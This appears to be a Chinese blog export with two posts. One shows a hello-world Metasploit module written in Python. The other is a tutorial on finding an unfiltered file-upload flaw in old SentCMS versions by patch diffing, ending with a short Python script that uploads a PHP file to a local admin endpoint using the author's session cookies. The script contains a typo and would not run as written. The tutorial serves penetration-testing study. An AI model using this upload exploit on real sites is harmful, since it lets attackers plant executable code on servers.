只能在已有的类型选项 </span><br><span class=\"line\">    &apos;type&apos;: &apos;dos&apos;,</span><br><span class=\"line\">    # 模块选项</span><br><span class=\"line\">    &apos;options&apos;: &#123;</span><br><span class=\"line\">        &apos;rhost&apos;: &#123;&apos;type&apos;: &apos;address&apos;, &apos;description&apos;: &apos;The target address&apos;, &apos;required&apos;: True, &apos;default&apos;: None&#125;,</span><br><span class=\"line\">        &apos;rport&apos;: &#123;&apos;type&apos;: &apos;port&apos;, &apos;description&apos;: &apos;The target port&apos;, &apos;required&apos;: True, &apos;default&apos;: 80&#125;,</span><br><span class=\"line\">     &#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后一般应该定义一个<code>run</code>方法.这个demo输出了helloworld<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def run(args):</span><br><span class=\"line\">    module.log(&apos;helloworld&apos;)</span><br></pre></td></tr></table></figure></p>\n<p>最后定义主方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    module.run(metadata, run)</span><br></pre></td></tr></table></figure></p>\n<p>让我们实际跑一下(注意请给你的python文件添加执行权限)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1</span><br><span class=\"line\">rhost =&gt; 127.0.0.1</span><br><span class=\"line\">msf5 auxiliary(test/demo) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Starting server...</span><br><span class=\"line\">[*] hello world</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br><span class=\"line\">msf5 auxiliary(test/demo) &gt;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby</p>\n<h3 id=\"为什么将python作为官方支持语言\"><a href=\"#为什么将python作为官方支持语言\" class=\"headerlink\" title=\"为什么将python作为官方支持语言\"></a>为什么将python作为官方支持语言</h3><ol>\n<li>很多不是metasploit官方人员编程的模块都是使用python编写</li>\n<li>现在python流行程度非常高 很多渗透人员python熟练程度比ruby高</li>\n</ol>\n<h3 id=\"metasploit的python模块是什么\"><a href=\"#metasploit的python模块是什么\" class=\"headerlink\" title=\"metasploit的python模块是什么\"></a>metasploit的python模块是什么</h3><p>主分支的一个python模块 <a href=\"https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py\" target=\"_blank\" rel=\"noopener\">https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py</a></p>\n<p>python模块实际是通过json-rpc调用与metasploit通信</p>\n<p>metasploit获取元数据如图(来自官方博客)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------+</span><br><span class=\"line\">| Metasploit |</span><br><span class=\"line\">|            |  Describe yourself  +-------------------+</span><br><span class=\"line\">|            +-------------------&gt; |  some_module.py   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |   Some metadata     |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     +-------------------+</span><br><span class=\"line\">|            |</span><br><span class=\"line\">|            |</span><br><span class=\"line\">+------------+</span><br></pre></td></tr></table></figure></p>\n<p>模块调用如图<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------+</span><br><span class=\"line\">| Metasploit |  Do a thing with</span><br><span class=\"line\">|            |   these options     +-------------------+</span><br><span class=\"line\">|            +-------------------&gt; |  some_module.py   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |   A bit of status   |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |  Moar status        |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |  I found a thing    |                   |</span><br><span class=\"line\">|            | &lt;-------------------+                   |</span><br><span class=\"line\">|            |                     |                   |</span><br><span class=\"line\">|            |                     +-------------------+</span><br><span class=\"line\">|            |</span><br><span class=\"line\">+------------+</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"将会发生什么\"><a href=\"#将会发生什么\" class=\"headerlink\" title=\"将会发生什么\"></a>将会发生什么</h3><p>实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块</p>\n<h3 id=\"python在metasploit能做什么\"><a href=\"#python在metasploit能做什么\" class=\"headerlink\" title=\"python在metasploit能做什么\"></a>python在metasploit能做什么</h3><p>可以使用的和ruby模块并没有区别</p>\n<h2 id=\"如何编写一个python模块\"><a href=\"#如何编写一个python模块\" class=\"headerlink\" title=\"如何编写一个python模块\"></a>如何编写一个python模块</h2><p>首先需要导入需要的模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># another:bluebird</span><br><span class=\"line\">from metasploit import module</span><br></pre></td></tr></table></figure></p>\n<p>这个metasploit实际上路径是 <code>lib/msf/core/modules/external/python/</code></p>\n<p>然后定义元数据 格式和ruby模块的一样.详细可参考<a href=\"https://www.kancloud.cn/bluebird/metasploit/486941\" target=\"_blank\" rel=\"noopener\">这里的文档</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">metadata = &#123;</span><br><span class=\"line\">\t# 模块名字</span><br><span class=\"line\">    &apos;name&apos;: &apos;metasploit python module demo &apos;,</span><br><span class=\"line\">    # 模块的描述</span><br><span class=\"line\">    &apos;description&apos;: &apos;&apos;&apos;</span><br><span class=\"line\">        send a http request metasploit python module demo</span><br><span class=\"line\">     &apos;&apos;&apos;,</span><br><span class=\"line\">     # 模块作者</span><br><span class=\"line\">    &apos;authors&apos;: [</span><br><span class=\"line\">        &apos;bluebird&apos;, </span><br><span class=\"line\">    ],</span><br><span class=\"line\">    # 编写时间</span><br><span class=\"line\">    &apos;date&apos;: &apos;2018-02-02&apos;,</span><br><span class=\"line\">    # 漏洞参考</span><br><span class=\"line\">    &apos;references&apos;: [</span><br><span class=\"line\">       </span><br><span class=\"line\">     ],</span><br><span class=\"line\">     # 漏洞类型 只能在已有的类型选项 </span><br><span class=\"line\">    &apos;type&apos;: &apos;dos&apos;,</span><br><span class=\"line\">    # 模块选项</span><br><span class=\"line\">    &apos;options&apos;: &#123;</span><br><span class=\"line\">        &apos;rhost&apos;: &#123;&apos;type&apos;: &apos;address&apos;, &apos;description&apos;: &apos;The target address&apos;, &apos;required&apos;: True, &apos;default&apos;: None&#125;,</span><br><span class=\"line\">        &apos;rport&apos;: &#123;&apos;type&apos;: &apos;port&apos;, &apos;description&apos;: &apos;The target port&apos;, &apos;required&apos;: True, &apos;default&apos;: 80&#125;,</span><br><span class=\"line\">     &#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后一般应该定义一个<code>run</code>方法.这个demo输出了helloworld<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def run(args):</span><br><span class=\"line\">    module.log(&apos;helloworld&apos;)</span><br></pre></td></tr></table></figure></p>\n<p>最后定义主方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    module.run(metadata, run)</span><br></pre></td></tr></table></figure></p>\n<p>让我们实际跑一下(注意请给你的python文件添加执行权限)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1</span><br><span class=\"line\">rhost =&gt; 127.0.0.1</span><br><span class=\"line\">msf5 auxiliary(test/demo) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Starting server...</span><br><span class=\"line\">[*] hello world</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br><span class=\"line\">msf5 auxiliary(test/demo) &gt;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"寻找历史漏洞","date":"2018-05-22T01:24:36.000Z","_content":"\n## 前言\n对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。\n但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞\n\n\n### 如何开始\n我们以`SentCMS`为例子 我们可以在码云下载到 [下载地址](https://gitee.com/sentcms/sentcms)  或者使用\n`git clone https://gitee.com/sentcms/sentcms`\n码云作为中国的github 自然是很方便。\n但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理\n因为git的版本管理和提交对比非常实用 也方便保存进度\n\n大致的git操作是\n~~~\ngit init  #初始化git仓库\ngit add * #将旧版本全部文件添加\ngit commit  # 作为初始提交\n# 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作\n# git status 可能你会想要查看一下文件差异\ngit add * # 将全部文件改变添加\ngit commit # 提交更改\n# git log 查看日志\n# git diff  查看差异\n\n~~~\n\n\n### 找到漏洞版本\n一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版\n 如果没有这种信息只能一个提交一个提交的去对比了\n 可以使用web查看  [地址](https://gitee.com/sentcms/sentcms/commits/master)\n\n你也可以使用\n~~~\ngit log\n~~~\n\n我们可以找到一条看起来可能是修复漏洞的提交\n![](https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png)\n\n\n### 比较差异\n可以在命令行使用`git diff` 来查看 也可以选择直接在web界面查看每个提交 [web提交地址](https://gitee.com/sentcms/sentcms/commits/master)\n\n如果不是git 在linux可以使用`diff`命令\n~~~\ndiff -r dir1 dir2\n~~~\n也可以选择使用一些你喜欢的文件对比工具\n\n\n### 最重要的一步 查看代码\n\n提交行数不多 快速查看 发现疑似漏洞点\n![](https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png)\n可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 [地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php)\n\n 这个时候阅读一下readme 可以看到\n~~~\n│ ├─common             COMMON公共模型，不可访问\n│ │ ├─controller      公共基类目录\n│ │ ├─model           模型目录\n│ │ ├─validate        验证配置\n│ │ ├─view            公共模板目录\n│ │ ├─widget          扩展组件目录\n~~~\n很明显我们不能直接访问 需要通过调用\n这个时候Ide就能帮助我们快速找到调用\n\n我们在ide搜索可以找到` application/admin/controller/Upload.php` 没有进行任何过滤的调用了\n~~~\nnamespace app\\admin\\controller;\nuse app\\common\\controller\\Admin;\n\nclass Upload extends Admin {\n\n\tpublic function _empty() {\n\t\t$controller = controller('common/Upload');\n\t\t$action     = $this->request->action();\n\t\treturn $controller->$action();\n\t}\n}\n~~~\n[web地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php)\n\n这个cms使用了tp5框架 需要通过路由访问\n我们访问\n~~~\nhttp://127.0.0.1/sentcms/admin/Upload/Upload\n~~~\n从报错信息可以看到已经执行到了漏洞语句位置\n由代码可知 直接上传文件即可\n\n### python编写exp\n~~~\nimport requests\nurl = 'http://127.0.0.1/sentcms/admin/Upload/Upload'\nfiles = {'phpinfo.php': open('phpinfo.txt','rb')}\n# 我本地cookeie\ncookie = {' remember_token':'1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484','PHPSESSID':'d4ubb72j0d9evlbktqqqct6ci2;'}\n\nr = requests.post(url, files=file，cookies=cookie)\n~~~\n我们可以在`uploads\\picture\\20180521`找到一个，以微秒时间的md5编码为文件名的php文件\n","source":"_posts/findbug.md","raw":"---\ntitle: 寻找历史漏洞\ndate: 2018-05-22 09:24:36\ntags:\n\tweb安全\ncategories:\n  - 网络安全\t\n---\n\n## 前言\n对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。\n但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞\n\n\n### 如何开始\n我们以`SentCMS`为例子 我们可以在码云下载到 [下载地址](https://gitee.com/sentcms/sentcms)  或者使用\n`git clone https://gitee.com/sentcms/sentcms`\n码云作为中国的github 自然是很方便。\n但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理\n因为git的版本管理和提交对比非常实用 也方便保存进度\n\n大致的git操作是\n~~~\ngit init  #初始化git仓库\ngit add * #将旧版本全部文件添加\ngit commit  # 作为初始提交\n# 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作\n# git status 可能你会想要查看一下文件差异\ngit add * # 将全部文件改变添加\ngit commit # 提交更改\n# git log 查看日志\n# git diff  查看差异\n\n~~~\n\n\n### 找到漏洞版本\n一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版\n 如果没有这种信息只能一个提交一个提交的去对比了\n 可以使用web查看  [地址](https://gitee.com/sentcms/sentcms/commits/master)\n\n你也可以使用\n~~~\ngit log\n~~~\n\n我们可以找到一条看起来可能是修复漏洞的提交\n![](https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png)\n\n\n### 比较差异\n可以在命令行使用`git diff` 来查看 也可以选择直接在web界面查看每个提交 [web提交地址](https://gitee.com/sentcms/sentcms/commits/master)\n\n如果不是git 在linux可以使用`diff`命令\n~~~\ndiff -r dir1 dir2\n~~~\n也可以选择使用一些你喜欢的文件对比工具\n\n\n### 最重要的一步 查看代码\n\n提交行数不多 快速查看 发现疑似漏洞点\n![](https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png)\n可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 [地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php)\n\n 这个时候阅读一下readme 可以看到\n~~~\n│ ├─common             COMMON公共模型，不可访问\n│ │ ├─controller      公共基类目录\n│ │ ├─model           模型目录\n│ │ ├─validate        验证配置\n│ │ ├─view            公共模板目录\n│ │ ├─widget          扩展组件目录\n~~~\n很明显我们不能直接访问 需要通过调用\n这个时候Ide就能帮助我们快速找到调用\n\n我们在ide搜索可以找到` application/admin/controller/Upload.php` 没有进行任何过滤的调用了\n~~~\nnamespace app\\admin\\controller;\nuse app\\common\\controller\\Admin;\n\nclass Upload extends Admin {\n\n\tpublic function _empty() {\n\t\t$controller = controller('common/Upload');\n\t\t$action     = $this->request->action();\n\t\treturn $controller->$action();\n\t}\n}\n~~~\n[web地址](https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php)\n\n这个cms使用了tp5框架 需要通过路由访问\n我们访问\n~~~\nhttp://127.0.0.1/sentcms/admin/Upload/Upload\n~~~\n从报错信息可以看到已经执行到了漏洞语句位置\n由代码可知 直接上传文件即可\n\n### python编写exp\n~~~\nimport requests\nurl = 'http://127.0.0.1/sentcms/admin/Upload/Upload'\nfiles = {'phpinfo.php': open('phpinfo.txt','rb')}\n# 我本地cookeie\ncookie = {' remember_token':'1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484','PHPSESSID':'d4ubb72j0d9evlbktqqqct6ci2;'}\n\nr = requests.post(url, files=file，cookies=cookie)\n~~~\n我们可以在`uploads\\picture\\20180521`找到一个，以微秒时间的md5编码为文件名的php文件\n","slug":"findbug","published":1,"updated":"2018-07-26T12:45:13.700Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi2w0008r4nxq6e212ws","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。<br>但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞</p>\n<h3 id=\"如何开始\"><a href=\"#如何开始\" class=\"headerlink\" title=\"如何开始\"></a>如何开始</h3><p>我们以<code>SentCMS</code>为例子 我们可以在码云下载到 <a href=\"https://gitee.com/sentcms/sentcms\" target=\"_blank\" rel=\"noopener\">下载地址</a>  或者使用<br><code>git clone https://gitee.com/sentcms/sentcms</code><br>码云作为中国的github 自然是很方便。<br>但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理<br>因为git的版本管理和提交对比非常实用 也方便保存进度</p>\n<p>大致的git操作是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init  #初始化git仓库</span><br><span class=\"line\">git add * #将旧版本全部文件添加</span><br><span class=\"line\">git commit  # 作为初始提交</span><br><span class=\"line\"># 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作</span><br><span class=\"line\"># git status 可能你会想要查看一下文件差异</span><br><span class=\"line\">git add * # 将全部文件改变添加</span><br><span class=\"line\">git commit # 提交更改</span><br><span class=\"line\"># git log 查看日志</span><br><span class=\"line\"># git diff  查看差异</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"找到漏洞版本\"><a href=\"#找到漏洞版本\" class=\"headerlink\" title=\"找到漏洞版本\"></a>找到漏洞版本</h3><p>一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版<br> 如果没有这种信息只能一个提交一个提交的去对比了<br> 可以使用web查看  <a href=\"https://gitee.com/sentcms/sentcms/commits/master\" target=\"_blank\" rel=\"noopener\">地址</a></p>\n<p>你也可以使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git log</span><br></pre></td></tr></table></figure></p>\n<p>我们可以找到一条看起来可能是修复漏洞的提交<br><img src=\"https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png\" alt=\"\"></p>\n<h3 id=\"比较差异\"><a href=\"#比较差异\" class=\"headerlink\" title=\"比较差异\"></a>比较差异</h3><p>可以在命令行使用<code>git diff</code> 来查看 也可以选择直接在web界面查看每个提交 <a href=\"https://gitee.com/sentcms/sentcms/commits/master\" target=\"_blank\" rel=\"noopener\">web提交地址</a></p>\n<p>如果不是git 在linux可以使用<code>diff</code>命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -r dir1 dir2</span><br></pre></td></tr></table></figure></p>\n<p>也可以选择使用一些你喜欢的文件对比工具</p>\n<h3 id=\"最重要的一步-查看代码\"><a href=\"#最重要的一步-查看代码\" class=\"headerlink\" title=\"最重要的一步 查看代码\"></a>最重要的一步 查看代码</h3><p>提交行数不多 快速查看 发现疑似漏洞点<br><img src=\"https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png\" alt=\"\"><br>可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 <a href=\"https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php\" target=\"_blank\" rel=\"noopener\">地址</a></p>\n<p> 这个时候阅读一下readme 可以看到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">│ ├─common             COMMON公共模型，不可访问</span><br><span class=\"line\">│ │ ├─controller      公共基类目录</span><br><span class=\"line\">│ │ ├─model           模型目录</span><br><span class=\"line\">│ │ ├─validate        验证配置</span><br><span class=\"line\">│ │ ├─view            公共模板目录</span><br><span class=\"line\">│ │ ├─widget          扩展组件目录</span><br></pre></td></tr></table></figure></p>\n<p>很明显我们不能直接访问 需要通过调用<br>这个时候Ide就能帮助我们快速找到调用</p>\n<p>我们在ide搜索可以找到<code>application/admin/controller/Upload.php</code> 没有进行任何过滤的调用了<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">namespace app\\admin\\controller;</span><br><span class=\"line\">use app\\common\\controller\\Admin;</span><br><span class=\"line\"></span><br><span class=\"line\">class Upload extends Admin &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function _empty() &#123;</span><br><span class=\"line\">\t\t$controller = controller(&apos;common/Upload&apos;);</span><br><span class=\"line\">\t\t$action     = $this-&gt;request-&gt;action();</span><br><span class=\"line\">\t\treturn $controller-&gt;$action();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php\" target=\"_blank\" rel=\"noopener\">web地址</a></p>\n<p>这个cms使用了tp5框架 需要通过路由访问<br>我们访问<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sentcms/admin/Upload/Upload</span><br></pre></td></tr></table></figure></p>\n<p>从报错信息可以看到已经执行到了漏洞语句位置<br>由代码可知 直接上传文件即可</p>\n<h3 id=\"python编写exp\"><a href=\"#python编写exp\" class=\"headerlink\" title=\"python编写exp\"></a>python编写exp</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;</span><br><span class=\"line\">files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;</span><br><span class=\"line\"># 我本地cookeie</span><br><span class=\"line\">cookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.post(url, files=file，cookies=cookie)</span><br></pre></td></tr></table></figure>\n<p>我们可以在<code>uploads\\picture\\20180521</code>找到一个，以微秒时间的md5编码为文件名的php文件</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。<br>但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞</p>\n<h3 id=\"如何开始\"><a href=\"#如何开始\" class=\"headerlink\" title=\"如何开始\"></a>如何开始</h3><p>我们以<code>SentCMS</code>为例子 我们可以在码云下载到 <a href=\"https://gitee.com/sentcms/sentcms\" target=\"_blank\" rel=\"noopener\">下载地址</a>  或者使用<br><code>git clone https://gitee.com/sentcms/sentcms</code><br>码云作为中国的github 自然是很方便。<br>但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理<br>因为git的版本管理和提交对比非常实用 也方便保存进度</p>\n<p>大致的git操作是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init  #初始化git仓库</span><br><span class=\"line\">git add * #将旧版本全部文件添加</span><br><span class=\"line\">git commit  # 作为初始提交</span><br><span class=\"line\"># 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作</span><br><span class=\"line\"># git status 可能你会想要查看一下文件差异</span><br><span class=\"line\">git add * # 将全部文件改变添加</span><br><span class=\"line\">git commit # 提交更改</span><br><span class=\"line\"># git log 查看日志</span><br><span class=\"line\"># git diff  查看差异</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"找到漏洞版本\"><a href=\"#找到漏洞版本\" class=\"headerlink\" title=\"找到漏洞版本\"></a>找到漏洞版本</h3><p>一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞  但是这个cms没有发行版<br> 如果没有这种信息只能一个提交一个提交的去对比了<br> 可以使用web查看  <a href=\"https://gitee.com/sentcms/sentcms/commits/master\" target=\"_blank\" rel=\"noopener\">地址</a></p>\n<p>你也可以使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git log</span><br></pre></td></tr></table></figure></p>\n<p>我们可以找到一条看起来可能是修复漏洞的提交<br><img src=\"https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png\" alt=\"\"></p>\n<h3 id=\"比较差异\"><a href=\"#比较差异\" class=\"headerlink\" title=\"比较差异\"></a>比较差异</h3><p>可以在命令行使用<code>git diff</code> 来查看 也可以选择直接在web界面查看每个提交 <a href=\"https://gitee.com/sentcms/sentcms/commits/master\" target=\"_blank\" rel=\"noopener\">web提交地址</a></p>\n<p>如果不是git 在linux可以使用<code>diff</code>命令<br><figure class=\"highlight 